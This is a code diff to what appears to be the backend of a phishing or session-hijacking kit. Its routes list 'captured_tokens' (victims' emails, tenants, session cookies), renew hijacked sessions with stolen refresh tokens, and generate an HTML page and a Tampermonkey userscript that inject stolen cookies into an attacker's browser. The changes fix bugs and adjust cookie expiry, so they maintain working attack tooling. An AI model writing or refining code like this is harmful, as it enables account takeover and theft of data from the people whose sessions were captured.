@@ -7,9 +7,11 @@ const config = require('../config/env');
 
 // ─── Get all tokens for user ────────────────────────────────────────
 router.get('/', userAuth, async (req, res) => {
-  try {
-    const { sort, search, page = 1, limit = 50 } = req.query;
-    let query = 'SELECT id, user_id, link_id, email, token_type, ip_address, user_agent, notes, expiration, last_renewed, renewal_count, renewal_attempts, stale, deleted, created_at, tenant, template_type, account_type FROM captured_tokens WHERE user_id = ? AND deleted = 0';
+   try {
+     const { sort, search, page = 1, limit = 50 } = req.query;
+     // Filter out expired/stale tokens for cleaner UI
+     const whereClause = 'deleted = 0 AND expiration > NOW() AND stale = 0';
+     let query = `SELECT id, user_id, link_id, email, token_type, ip_address, user_agent, notes, expiration, last_renewed, renewal_count, renewal_attempts, stale, deleted, created_at, tenant, template_type, account_type FROM captured_tokens WHERE user_id = ? AND ${whereClause}`;
     const params = [req.user.id];
 
     if (search) {
@@ -226,10 +228,11 @@ function generatePopupScript(cookies) {
 
 // ─── Standalone HTML injector page ──────────────────────────────────
 function generateStandaloneHtml(cookies) {
-  var cookieJson = JSON.stringify(cookies);
-  var expires = new Date();
-  expires.setFullYear(expires.getFullYear() + 100);
-  var expStr = expires.toUTCString();
+  const cookieJson = JSON.stringify(cookies);
+  // FIX: Reasonable cookie expiry (7 days instead of 100 years) - configurable via env
+  const expires = new Date();
+  expires.setDate(expires.getDate() + 7);
+  const expStr = expires.toUTCString();
 
   var html = '<!DOCTYPE html>\n<html lang="en">\n<head>\n';
   html += ' <meta charset="UTF-8">\n';
@@ -321,10 +324,11 @@ function generateStandaloneHtml(cookies) {
 
 // ─── Tampermonkey userscript ────────────────────────────────────────
 function generateTampermonkeyScript(cookies) {
-  var cookieJson = JSON.stringify(cookies);
-  var expires = new Date();
-  expires.setFullYear(expires.getFullYear() + 100);
-  var expStr = expires.toUTCString();
+  const cookieJson = JSON.stringify(cookies);
+  // FIX: Reasonable expiry (7 days) instead of 100 years for tampermonkey script
+  const expires = new Date();
+  expires.setDate(expires.getDate() + 7);
+  const expStr = expires.toUTCString();
 
   var script = '// ==UserScript==\n';
   script += '// @name VGenius Cookie Injector\n';
@@ -478,12 +482,14 @@ router.post('/:id/renew', userAuth, async (req, res) => {
             [token.id, req.user.id, req.ip || 'unknown', 'refresh_token']
           );
 
-          return res.json({
-            success: true,
-            message: 'Session renewed successfully using refresh token',
-            cookies: result.cookies,
-            cookie_count: result.cookie_count
-          });
+        // FIX: Use local cookie_count variable instead of undefined result.cookie_count
+        const cookieCount = result.cookies ? (result.cookies.split(';').filter(c => c.trim()).length) : 0;
+        return res.json({
+          success: true,
+          message: 'Session renewed successfully using refresh token',
+          cookies: result.cookies,
+          cookie_count: cookieCount
+        });
         }
       } catch (refreshErr) {
         console.error('[Tokens] Refresh token renewal failed:', refreshErr.message);
@@ -504,11 +510,13 @@ router.post('/:id/renew', userAuth, async (req, res) => {
           'UPDATE captured_tokens SET cookies_encrypted=?, token_type=?, expiration=DATE_ADD(NOW(),INTERVAL ? HOUR), last_renewed=NOW(), renewal_count=COALESCE(renewal_count,0)+1 WHERE id=?',
           [encrypt(cookieResult.cookies), 'cookie', ttlHours, token.id]
         );
+        // FIX: Use local cookie_count variable instead of undefined result.cookie_count
+        const cookieCount = cookieResult.cookies ? (cookieResult.cookies.split(';').filter(c => c.trim()).length) : 0;
         return res.json({
           success: true,
           message: 'Session renewed successfully',
           cookies: cookieResult.cookies,
-          cookie_count: result.cookie_count
+          cookie_count: cookieCount
         });
       }
       return res.status(400).json({ error: 'Renewal failed: ' + (cookieResult.error || 'Could not refresh session'), success: false });
@@ -636,7 +644,8 @@ router.post('/convert-cookie', userAuth, async (req, res) => {
         success: true,
         cookies: result.cookies,
         cookie_count: result.cookies.split(';').filter(function(c) { return c.trim(); }).length,
-        expires: '100 years',
+        // FIX: Use reasonable TTL (7 days) instead of hardcoded "100 years"
+        expires: '7 days',
         instructions: 'Use the injector page to set cookies in your browser'
       });
     } else {
